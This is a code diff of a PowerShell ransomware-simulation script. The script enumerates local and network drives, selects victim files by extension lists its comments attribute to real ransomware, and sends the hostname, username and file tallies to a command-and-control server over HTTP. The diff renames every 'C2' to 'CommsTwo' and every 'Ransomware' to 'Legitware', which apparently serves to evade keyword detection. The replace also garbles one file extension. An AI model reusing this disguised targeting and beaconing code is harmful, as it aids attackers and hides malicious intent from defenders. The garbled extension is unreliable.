@@ -4,10 +4,10 @@ Begin {
 $EnumerateTargets=@()
 $files=@()
 $AffectedFiles=@()
-$C2Server = '' # ChangeMe
-$C2Port = '1337' # ChangeMe
-$C2Schema = 'http://' # ChangeMe
-$C2Payload = ""
+$CommsTwoServer = '' # ChangeMe
+$CommsTwoPort = '1337' # ChangeMe
+$CommsTwoSchema = 'http://' # ChangeMe
+$CommsTwoPayload = ""
 $Threads = 50
 
 
@@ -25,31 +25,31 @@ $SophisticationLevel = 1
 $EnumerationFilter = "Whitelist"
 
 
-# Blacklist derived from sodinokibi ransomware
+# Blacklist derived from sodinokibi Legitware
 $Blacklist = @("msstyles", "icl", "idx", "rtp", "sys", "nomedia", "dll", "hta", "cur", "lock", "cpl", "ics", "hlp", "com", "spl", "msi", "key", "mpa", "rom", "drv", "bat", "386", "adv", "diagcab", "mod", "scr", "theme", "ocx", "prf", "cab", "diagcfg", "msu", "cmd", "ico", "msc", "ani", "icns", "diagpkg", "deskthemepack", "wpx", "msp", "bin", "themepack", "shs", "nls", "exe", "lnk", "ps1", "ldf", "ntuser.dat", "desktop.ini", "thumbs.db", "iconcache.db", "ntuser.ini", "ntldr", "bootfont.bin", "ntuser.dat.log", "bootsect.bak", "boot.ini", "autorun.inf")
 
 # Whitelist derived from teslacrypt and then added additional common extensions
-$Whitelist = @("pdb", "dat", "json", "7z", "zip", "map", "m2", "rb", "jpg", "rar", "wmo", "mcmeta", "png", "cdr", "m4a", "itm", "vfs0", "jpeg", "indd", "wma", "sb", "mpqge", "txt", "ai", "avi", "fos", "kdb", "p7c", "eps", "wmv", "mcgame", "db0", "p7b", "pdf", "csv", "vdf", "DayZProfile", "p12", "pdd", "d3dbsp", "ztmp", "rofl", "pfx", "psd", "sc2save", "sis", "hkx", "pem", "dbfv", "sie", "sid", "bar", "crt", "mdf", "sum", "ncf", "upk", "cer", "wb2", "ibank", "menu", "das", "der", "rtf", "t13", "layout", "iwi", "x3f", "wpd", "t12", "dmp", "litemod", "srw", "dxg", "qdf", "blob", "asset", "pef", "xf", "gdb", "esm", "forge", "ptx", "dwg", "tax", "001", "ltx", "r3d", "pst", "pkpass", "vtf", "bsa", "rw2", "accdb", "bc6", "dazip", "apk", "rwl", "mdb", "bc7", "fpk", "re4", "raw", "pptm", "bkp", "mlx", "sav", "raf", "pptx", "qic", "kf", "lbf", "orf", "ppt", "bkf", "iwd", "slm", "nrw", "xlk", "sidn", "vpk", "bik", "mrwref", "xlsb", "sidd", "tor", "epk", "mef", "xlsm", "mddata", "psk", "rgss3a", "erf", "xlsx", "itl", "rim", "pak", "kdc", "xls", "itdb", "w3x", "big", "dcr", "wps", "icxs", "fsh", "unity3d", "cr2", "docm", "hvpl", "ntl", "wotreplay", "crw", "docx", "hplg", "arch00", "xxx", "bay", "doc", "hkdb", "lvl", "desc", "sr2", "odb", "mdbackup", "snx", "py", "srf", "odc", "syncdb", "cfr", "m3u", "arw", "odm", "gho", "ff", "flv", "3fr", "odp", "cas", "vpp_pc", "js", "dng", "ods", "svg", "lrf", "css", "jpe", "odt", "pps", "xlr", "java", "h", "sh", "vbs", "py", "swift", "ps1", "crt", "cer", "key", "bak", "bkup", "tex", "wks", "m4v", "kbds", "mpeg", "mpg", "mov", "php", "asp", "aspx", "pl", "js", "jsp", "xhtml", "bmp", "gif", "*ico", "svg", "jar", "sql", "tar", "xml", "mp3", "wav", "ogg")
+$Whitelist = @("pdb", "dat", "json", "7z", "zip", "map", "m2", "rb", "jpg", "rar", "wmo", "mcmeta", "png", "cdr", "m4a", "itm", "vfs0", "jpeg", "indd", "wma", "sb", "mpqge", "txt", "ai", "avi", "fos", "kdb", "p7c", "eps", "wmv", "mcgame", "db0", "p7b", "pdf", "csv", "vdf", "DayZProfile", "p12", "pdd", "d3dbsp", "ztmp", "rofl", "pfx", "psd", "sCommsTwosave", "sis", "hkx", "pem", "dbfv", "sie", "sid", "bar", "crt", "mdf", "sum", "ncf", "upk", "cer", "wb2", "ibank", "menu", "das", "der", "rtf", "t13", "layout", "iwi", "x3f", "wpd", "t12", "dmp", "litemod", "srw", "dxg", "qdf", "blob", "asset", "pef", "xf", "gdb", "esm", "forge", "ptx", "dwg", "tax", "001", "ltx", "r3d", "pst", "pkpass", "vtf", "bsa", "rw2", "accdb", "bc6", "dazip", "apk", "rwl", "mdb", "bc7", "fpk", "re4", "raw", "pptm", "bkp", "mlx", "sav", "raf", "pptx", "qic", "kf", "lbf", "orf", "ppt", "bkf", "iwd", "slm", "nrw", "xlk", "sidn", "vpk", "bik", "mrwref", "xlsb", "sidd", "tor", "epk", "mef", "xlsm", "mddata", "psk", "rgss3a", "erf", "xlsx", "itl", "rim", "pak", "kdc", "xls", "itdb", "w3x", "big", "dcr", "wps", "icxs", "fsh", "unity3d", "cr2", "docm", "hvpl", "ntl", "wotreplay", "crw", "docx", "hplg", "arch00", "xxx", "bay", "doc", "hkdb", "lvl", "desc", "sr2", "odb", "mdbackup", "snx", "py", "srf", "odc", "syncdb", "cfr", "m3u", "arw", "odm", "gho", "ff", "flv", "3fr", "odp", "cas", "vpp_pc", "js", "dng", "ods", "svg", "lrf", "css", "jpe", "odt", "pps", "xlr", "java", "h", "sh", "vbs", "py", "swift", "ps1", "crt", "cer", "key", "bak", "bkup", "tex", "wks", "m4v", "kbds", "mpeg", "mpg", "mov", "php", "asp", "aspx", "pl", "js", "jsp", "xhtml", "bmp", "gif", "*ico", "svg", "jar", "sql", "tar", "xml", "mp3", "wav", "ogg")
 
 }
 
 Process {
-# Build String to be sent as C2 Payload, essentially just console output
-$C2Payload += ("Simulating Ransomware Infection Routine!`n")
-$C2Payload +=  ("Sophistication Level: " + $SophisticationLevel + "`n")
-$C2Payload +=  ("Enumeration Filter Criteria: " + $EnumerationFilter + "`n")
-$C2Payload +=  ("Hostname: " + $env:COMPUTERNAME + "`n")
-$C2Payload +=  ("Current User: " + $env:USERDOMAIN + '\' + $env:USERNAME + "`n")
-Write-Host $C2Payload
+# Build String to be sent as CommsTwo Payload, essentially just console output
+$CommsTwoPayload += ("Simulating Legitware Routine!`n")
+$CommsTwoPayload +=  ("Sophistication Level: " + $SophisticationLevel + "`n")
+$CommsTwoPayload +=  ("Enumeration Filter Criteria: " + $EnumerationFilter + "`n")
+$CommsTwoPayload +=  ("Hostname: " + $env:COMPUTERNAME + "`n")
+$CommsTwoPayload +=  ("Current User: " + $env:USERDOMAIN + '\' + $env:USERNAME + "`n")
+Write-Host $CommsTwoPayload
 
 
-# Attempt to reach the C2 Server
-if($C2Server){
+# Attempt to reach the CommsTwo Server
+if($CommsTwoServer){
     Try {
-        $C2Status = Invoke-WebRequest -uri ($C2Schema + $C2Server + ":" + $C2Port + "/Status") -Method GET
-        Write-Verbose "C2 Connection: OK"
+        $CommsTwoStatus = Invoke-WebRequest -uri ($CommsTwoSchema + $CommsTwoServer + ":" + $CommsTwoPort + "/Status") -Method GET
+        Write-Verbose "CommsTwo Connection: OK"
     } Catch {
-        Write-Warning "C2 Server is not reachable"
+        Write-Warning "CommsTwo Server is not reachable"
         Exit(1)
     }
 }
@@ -259,7 +259,7 @@ End{
 $AllDrives = (Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -ne 0})
 
 
-# If Basic Ransomware
+# If Basic Legitware
 if ($SophisticationLevel -eq 1) {
     $AllDrives | ForEach-Object {
         if ($_.DisplayRoot) {
@@ -271,7 +271,7 @@ if ($SophisticationLevel -eq 1) {
 }
 
 
-# If Intermediate Ransomware
+# If Intermediate Legitware
 if ($SophisticationLevel -eq 2) {
     # Enumerate Quick Access Network Shortcuts
     $objSh = New-Object -ComObject shell.application
@@ -294,7 +294,7 @@ if ($SophisticationLevel -eq 2) {
 # Loop Through Drives
 foreach ($target in $EnumerateTargets | Where-Object{Test-Path $_}) {
    Write-Host ("Enumerating " + $target)
-   $C2Payload += ("Enumerating " + $target + "`n")
+   $CommsTwoPayload += ("Enumerating " + $target + "`n")
 
    # Enumerate Files using Filter Style Blacklist or Whitelist
    if ($EnumerationFilter -eq 'Whitelist'){
@@ -314,7 +314,7 @@ foreach ($target in $EnumerateTargets | Where-Object{Test-Path $_}) {
 
 $AffectedFiles = $AffectedFiles | Where-Object {$_.FullName -ne $null}
 # Count of Files
-$C2Payload += ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count) + "`n")
+$CommsTwoPayload += ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count) + "`n")
 Write-Host ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count))
 
 
@@ -322,23 +322,23 @@ Write-Host ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Co
 $TotalData = ($AffectedFiles | Measure-Object -Sum Size).Sum
 if ($TotalData -gt 1GB) {
     Write-Host ("Total Simulated Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
-    $C2Payload += ("Total Simulated Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
+    $CommsTwoPayload += ("Total Simulated Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
 } else {
     Write-Host ("Total Simulated Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
-    $C2Payload += ("Total Simulated Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
+    $CommsTwoPayload += ("Total Simulated Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
 }
 
 # Top File Types by Extension
 $TopTenFileTypes = $AffectedFiles | Group-Object -Property Extension -NoElement | Sort-Object -Property Count -Descending | Select-Object -First 10
 Write-host ($TopTenFileTypes | Out-String)
-$C2Payload += ($TopTenFileTypes | Out-String)
+$CommsTwoPayload += ($TopTenFileTypes | Out-String)
 }
 
 End {
 
-# Post Output Report to C2 Server
-if ($C2Server){
-    $null = Invoke-WebRequest -Uri ($C2Schema + $C2Server + ":" + $C2Port + "/receive") -Method POST -Body $C2Payload
+# Post Output Report to CommsTwo Server
+if ($CommsTwoServer){
+    $null = Invoke-WebRequest -Uri ($CommsTwoSchema + $CommsTwoServer + ":" + $CommsTwoPort + "/receive") -Method POST -Body $CommsTwoPayload
 }
 # Done
 }
